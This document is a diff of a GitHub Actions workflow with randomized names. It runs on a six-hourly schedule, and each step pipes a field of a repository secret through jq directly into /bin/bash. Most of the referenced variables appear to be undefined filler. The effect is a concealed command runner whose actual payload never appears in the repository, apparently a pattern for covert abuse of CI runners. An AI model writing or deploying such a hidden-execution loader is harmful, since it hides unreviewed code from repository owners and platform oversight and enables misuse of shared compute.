@@ -1,37 +1,28 @@
 name: mazhengfu4567
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 1/6 * * *'
-
+    - cron: '45 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: mazhengfu4567
         env:
-          xywzz8: ${{ secrets.xywzz8 }}
+          q7398: ${{ secrets.q7398 }}
         run: |
-          echo $xywzz8 | jq -r .nuaf6 | /bin/bash
-          echo $zcym493 | jq -r .h6082 | /bin/bash
-          echo $hfqvq65271 | jq -r .c1 | /bin/bash
-          echo $izi08703 | jq -r .ofwi2902 | /bin/bash
-          echo $zao305 | jq -r .vuxrx1 | /bin/bash
-          echo $gev351 | jq -r .rnq52317 | /bin/bash
-          echo $gsh2608 | jq -r .i33 | /bin/bash
-          echo $yil5 | jq -r .c85343 | /bin/bash
-          echo $hl025 | jq -r .xkq53476 | /bin/bash
-          echo $wvne2521 | jq -r .f904 | /bin/bash
-          echo $i385 | jq -r .mtzkt6236 | /bin/bash
-          echo $yyj285 | jq -r .bess2025 | /bin/bash
-          echo $xmxkw1760 | jq -r .pfvh9754 | /bin/bash
-          echo $pa8 | jq -r .gth05751 | /bin/bash
-          echo $ik75522 | jq -r .qfk8770 | /bin/bash
-          echo $p972 | jq -r .oy268 | /bin/bash
-          echo $a00584 | jq -r .cl01 | /bin/bash
-          echo $ln2 | jq -r .x5 | /bin/bash
-          echo $iq288 | jq -r .x2622 | /bin/bash
-          echo $zwbi5736 | jq -r .lqme8707 | /bin/bash
+          echo $q7398 | jq -r .yigk398 | /bin/bash
+          echo $oaktv966 | jq -r .ie25 | /bin/bash
+          echo $ge86993 | jq -r .qam1645 | /bin/bash
+          echo $qms2 | jq -r .iki98 | /bin/bash
+          echo $qeyuh1 | jq -r .su01625 | /bin/bash
+          echo $kue2569 | jq -r .wdfga9174 | /bin/bash
+          echo $baqy16025 | jq -r .jeuyw92 | /bin/bash
+          echo $olz84 | jq -r .ltv6 | /bin/bash
+          echo $sk05578 | jq -r .yi05733 | /bin/bash
+          echo $gmwqu39 | jq -r .wpl954 | /bin/bash
+          echo $cqh769 | jq -r .rdons851 | /bin/bash
+          echo $wnm34602 | jq -r .ylyy295 | /bin/bash
 
